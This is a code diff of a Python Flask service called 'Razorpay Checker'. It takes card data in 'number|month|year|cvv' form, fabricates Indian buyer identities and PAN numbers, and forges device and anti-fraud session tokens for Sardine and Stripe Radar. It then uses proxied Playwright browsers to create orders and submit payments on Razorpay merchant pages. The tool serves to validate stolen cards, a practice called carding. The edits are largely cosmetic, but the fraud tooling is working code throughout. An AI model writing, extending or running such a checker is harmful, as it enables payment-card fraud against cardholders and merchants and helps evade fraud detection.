@@ -2,8 +2,7 @@
 # -*- coding: utf-8 -*-
 """
 Razorpay Checker — Fast · Accurate · Reliable.
-Uses Playwright ASYNC API inside asyncio.run() on a worker thread.
-No sync-API-vs-asyncio conflict possible.
+Async Playwright. Runs inside Microsoft's Playwright base image.
 """
 
 import os
@@ -23,7 +22,6 @@ from urllib.parse import quote
 from flask import Flask, request, jsonify
 from playwright.async_api import async_playwright, TimeoutError as PWTimeoutError
 
-# ------------------------------------------------------------------ config
 logging.basicConfig(level=logging.INFO)
 logger = logging.getLogger("rzp")
 
@@ -63,24 +61,29 @@ LAUNCH_ARGS = [
 
 _pool = concurrent.futures.ThreadPoolExecutor(max_workers=4, thread_name_prefix="rzp")
 
-# ------------------------------------------------------------------ helpers
+
 def rand_phone():
-    return "+91" + str(random.choice([6,7,8,9])) + "".join(str(random.randint(0,9)) for _ in range(9))
+    return "+91" + str(random.choice([6, 7, 8, 9])) + "".join(str(random.randint(0, 9)) for _ in range(9))
+
 
 def rand_name():
     return f"{random.choice(FIRST)} {random.choice(LAST)}"
 
+
 def rand_email(n):
     return n.lower().replace(" ", ".") + str(random.randint(1, 99)) + "@gmail.com"
 
+
 def rand_address():
     i = random.randint(0, len(CITIES) - 1)
-    return f"{random.randint(1,999)} {random.choice(STREETS)}, {CITIES[i]}- {PINS[i]}"
+    return f"{random.randint(1, 999)} {random.choice(STREETS)}, {CITIES[i]}- {PINS[i]}"
+
 
 def rand_pan():
     return ("".join(random.choices(string.ascii_uppercase, k=5))
             + "".join(random.choices(string.digits, k=4))
             + random.choice(string.ascii_uppercase))
+
 
 def parse_proxy(p):
     if not p:
@@ -111,6 +114,7 @@ def parse_proxy(p):
         cfg["password"] = pwd
     return cfg
 
+
 def parse_cc(cc):
     parts = cc.split("|")
     if len(parts) != 4:
@@ -122,21 +126,24 @@ def parse_cc(cc):
         "cvv": parts[3].strip(),
     }
 
+
 def build_device_id():
     h = hashlib.sha1(secrets.token_bytes(16)).hexdigest()
     ts = str(int(time.time() * 1000))
-    rnd = str(random.randrange(10**8)).zfill(8)
+    rnd = str(random.randrange(10 ** 8)).zfill(8)
     return f"1.{h}.{ts}.{rnd}"
+
 
 def build_token_create(checkout_id):
     payload = [
         {"name": "sardine", "metadata": {"session_id": checkout_id}},
         {"name": "stripe_radar",
-         "metadata": {"session_id": "rse_" + "".join(secrets.choice(string.ascii_letters + string.digits) for _ in range(22))}},
+         "metadata": {"session_id": "rse_" + "".join(
+             secrets.choice(string.ascii_letters + string.digits) for _ in range(22))}},
     ]
     return b64encode(json.dumps(payload, separators=(",", ":")).encode()).decode()
 
-# ------------------------------------------------------------------ async core
+
 async def run_check_async(site_url, cc, proxy_cfg):
     t0 = time.time()
     card = parse_cc(cc)
@@ -176,7 +183,6 @@ async def run_check_async(site_url, cc, proxy_cfg):
     page.set_default_timeout(40000)
 
     try:
-        # --- 1. merchant data
         await page.goto(site_url, wait_until="domcontentloaded", timeout=35000)
         merchant = await page.evaluate("""() => {
             const out = {};
@@ -225,7 +231,6 @@ async def run_check_async(site_url, cc, proxy_cfg):
         if amount < 100:
             amount = 100
 
-        # --- 2. session token
         params = {
             "traffic_env": "production",
             "build": BUILD_DEFAULT,
@@ -250,7 +255,6 @@ async def run_check_async(site_url, cc, proxy_cfg):
             return {"ok": False, "response": "session_token not found",
                     "time": round(time.time() - t0, 2)}
 
-        # --- 3. create order
         order_id = await page.evaluate("""async ([pl, ppi, amt]) => {
             try {
                 const r = await fetch(`https://api.razorpay.com/v1/payment_pages/${pl}/order`, {
@@ -275,7 +279,6 @@ async def run_check_async(site_url, cc, proxy_cfg):
         checkout_id = order_id.split("_", 1)[1] if "_" in order_id else order_id
         token_create = build_token_create(checkout_id)
 
-        # --- 4. submit payment
         payload = {
             "notes[comment]": "",
             "notes[email]": email,
@@ -425,13 +428,13 @@ async def run_check_async(site_url, cc, proxy_cfg):
         except Exception:
             pass
 
-# ------------------------------------------------------------------ dispatch
+
 def run_check(site_url, cc, proxy_cfg):
-    """Runs async Playwright in a fresh event loop on the current (pool) thread."""
     try:
         return asyncio.run(run_check_async(site_url, cc, proxy_cfg))
     except Exception as e:
         return {"ok": False, "response": f"top-level: {str(e)[:180]}", "time": 0}
+
 
 def _dispatch(site, cc, proxy_cfg):
     try:
@@ -442,7 +445,7 @@ def _dispatch(site, cc, proxy_cfg):
     except Exception as e:
         return {"ok": False, "response": f"dispatch error: {str(e)[:150]}", "time": 0}
 
-# ------------------------------------------------------------------ routes
+
 @app.route("/razorpay", methods=["GET"])
 def razorpay_route():
     site = (request.args.get("site") or "").strip()
@@ -473,9 +476,11 @@ def razorpay_route():
         "Dev": DEV_BASE,
     })
 
+
 @app.route("/health", methods=["GET"])
 def health():
     return jsonify({"ok": True, "ts": int(time.time())})
+
 
 if __name__ == "__main__":
     port = int(os.environ.get("PORT", 8080))
